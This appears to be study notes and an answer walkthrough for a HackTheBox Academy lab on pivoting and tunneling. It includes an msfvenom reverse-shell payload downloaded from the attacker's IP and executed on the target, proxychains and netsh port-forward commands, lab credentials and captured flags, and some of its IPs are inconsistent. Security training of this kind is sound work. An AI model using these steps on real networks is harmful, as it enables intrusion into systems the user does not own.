# Pivoting, Tunneling and Port forwarding

<figure><img src=".gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>

Pivoting

* when we obtained credentials (SSH, creds, hashes, tokens..), but we cant connect to the target
* we may need to use a PIVOT HOST to find a way to our next target (Hop)
* pivot:
  * pivot host
  * proxy
  * foothold
  * beach head system
  * jump host
* if a host has more than 1 network adapter -> we can use it to move to a different network segment....
* PIVOTING = TO DEFEAT SEGMENTATION TO ACCESS AN ISOLATED NETWORK
* TUNNELLING = subset of pivoting, ENCAPSULATES NETWORK TRAFFIC INTO ANOTHER PROTOCOL AND TOUTES TRAFFIC THROUGGH IT

One way we used Tunneling was to craft our traffic to hide in HTTP and HTTPS. This is a common way we maintained Command and Control (C2) of the hosts we had compromised within a network. We masked our instructions inside GET and POST requests that appeared as normal traffic and, to the untrained eye, would look like a web request or response to any old website. If the packet were formed properly, it would be forwarded to our Control server. If it were not, it would be redirected to another website, potentially throwing off the defender checking it out.

<figure><img src=".gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

## Choosing the Dig Site & Starting our Tunnels

### Dynamic port FW w SSH and SOCKS Tunneling

<figure><img src=".gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>

Port forwarding&#x20;

* \= to redirect a communication request from one port to another
* uses TCP / SSH / SOCKS (non-application layer)

<figure><img src=".gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>

**You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many network interfaces does the target web server have? (Including the loopback interface)**

`ssh ubuntu@10.129.187.139`

* PW: **HTB\_@cademy\_stdnt!**

`ifconfig`

**Apply the concepts taught in this section to pivot to the internal network and use RDP (credentials: victor:pass@123) to take control of the Windows target on 172.16.5.19. Submit the contents of Flag.txt located on the Desktop.**

`ssh -D 9050 ubuntu@10.129.249.211`

* PW: **HTB\_@cademy\_stdnt!**

`tail -4 /etc/proxychains.conf`

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

`proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`

![](<.gitbook/assets/image (319).png>)



### Remote/Reverse port FW w SSH

<figure><img src=".gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

When we want to forward a local service to the remote port...

* FE: we can RDP into Win host (Windows A) - we could pivot into the Win host via Ubuntu server...

**Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)**

`ssh ubuntu@10.129.148.124`

PW: HTB\_@cademy\_stdnt!

ifconfig

* ens224 interface

<figure><img src=".gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

**What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host? (Format: x.x.x.x)**

0.0.0.0

### Meterpreter Tunneling & port Forwarding



**What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)**

msfvenom -p linux/x64/meterpreter/reverse\_tcp LHOST=10.10.14.135 -f elf -o backupjob LPORT=8080

<figure><img src=".gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>

`msfconsole -q`

`use exploit/multi/handler`

`set lhost 0.0.0.0`

`set lport 8080`

`set payload linux/x64/meterpreter/reverse_tcp`

`run`

NOW IN MY MACHINE

`python3 -m http.server 4444`

NOW IN TARGER MACHINE

`wget 10.10.14.135:4444/backupjob`

`ls`

`chmod +x backupjob`

`./backupjob`

<figure><img src=".gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

172.16.5.19,172.16.5.129

**Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)**

<figure><img src=".gitbook/assets/image (311).png" alt=""><figcaption></figcaption></figure>

172.16.5.0/255.255.254.0

## Playing Pong w SOCAT

### Socat Redirection w Reverse Shell

**SSH tunneling is required with Socat. True or False?**

False

### Socat Redirection w Bind Shell![](<.gitbook/assets/image (312).png>)

**What Meterpreter payload did we use to catch the bind shell session? (Submit the full path as the answer)**

<figure><img src=".gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

windows/x64/meterpreter/bind\_tcp

## Pivoting Around Obstacles

### SSH for Windows: plink.exe

<figure><img src=".gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

PLINK = PuTTY link

* Windows command-line SSH tool as a part of PuTTY package
* Plink can also create dynamic port forwards and SOCKS proxies

**Attempt to use Plink from a Windows-based attack host. Set up a proxy connection and RDP to the Windows target (172.16.5.19) with "victor:pass@123" on the internal network. When finished, submit "I tried Plink" as the answer.**

I tried Plink

### SSH Pivoting w sshuttle

sudo apt-get install sshuttle

Try using sshuttle from Pwnbox to connect via RDP to the Windows target (172.16.5.19) with "victor:pass@123" on the internal network. Once completed type: "I tried sshuttle" as the answer.

I tried sshuttle

### Web Server pivoting w Rpivot

<figure><img src=".gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>

**From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer.**

Attack Host

**From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host. Submit Pivot Host or Attack Host as the answer.**

Pivot Host

**Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer.**

`sudo git clone https://github.com/klsecservices/rpivot.git`

`sudo apt-get install python2.7`

`python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`

HTB\_@cademy\_stdnt!

`scp -r rpivot ubuntu@`10.129.202.64`:/home/ubuntu/`

<figure><img src=".gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

`ssh ubuntu@10.129.202.64`

HTB\_@cademy\_stdnt!

`cd rpivot`

`python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`

<figure><img src=".gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

`proxychains firefox-esr 172.16.5.135:80`

<figure><img src=".gitbook/assets/image (318).png" alt=""><figcaption><p>I_L0v3_Pr0xy_Ch@ins</p></figcaption></figure>

### Port Forwarding w Windows. Netsh

<figure><img src=".gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

### **When to use?**&#x20;

When our pivot machine is a Windows system.

**Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive)**&#x20;

The first step was to use the tool `xfreerdp` to start a RDP session to the pivot host.&#x20;

`xfreerdp /v:10.129.54.183 /u:htb-student /p:HTB_@cademy_stdnt!`

`open CMD`

`cd /Windows/system32`

Then, we configured a `portproxy` using the `netsh.exe` utility. The command below will forward all traffic coming to the pivot (10.129.236.31) on port 8080 to the target Windows server (172.16.5.25) on port 3389.

```
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.54.183 connectport=3389 connectaddress=172.16.5.19
```

We can verify that the port forwarding was properly configured using the following command:

```
netsh.exe interface portproxy show v4tov4
```

<figure><img src=".gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

Once the port fowarding has been configured. We were able to start a RDP session for the Windows target server from our attacker host machine.&#x20;

The following command uses `xfreerdp` to connect to the pivot host on port 8080, but because we configured a tunnel, all traffic is forwarded to the Windows system with the IP 172.16.5.25 on port 3389.&#x20;

```
xfreerdp /v:10.129.236.31:8080 /u:victor /p:pass@123
```

<figure><img src=".gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>

## Branching out Our Tunnels

### DNS Tunneling w DNScat2

### SOCKS5 Tunneling w Chisel

### ICMP Tunneling w SOCKS

## Double Pivots

### RDP and SOCKS Tunneling w SocksOverRDP

## Skills Assessment
